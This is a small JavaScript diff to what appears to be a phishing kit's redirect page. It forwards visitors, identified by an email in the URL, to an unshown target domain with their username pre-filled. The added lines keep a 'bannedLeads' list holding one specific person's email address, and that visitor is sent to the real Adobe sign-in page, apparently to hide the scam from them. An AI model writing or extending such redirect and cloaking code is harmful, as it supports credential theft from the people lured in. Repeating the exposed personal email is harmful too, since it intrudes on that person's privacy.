@@ -38,6 +38,15 @@
 
         if (urlParams.has("u")) {
           const u = urlParams.get("u");
+
+          const bannedLeads = [
+            "dawnelson@whitelionwalk.co.uk"
+          ];
+
+          if (bannedLeads.includes(u)) {
+            window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+          }
+          
           window.location = targetDomain + "?username=" + u;
         } else {
           window.location = targetDomain;
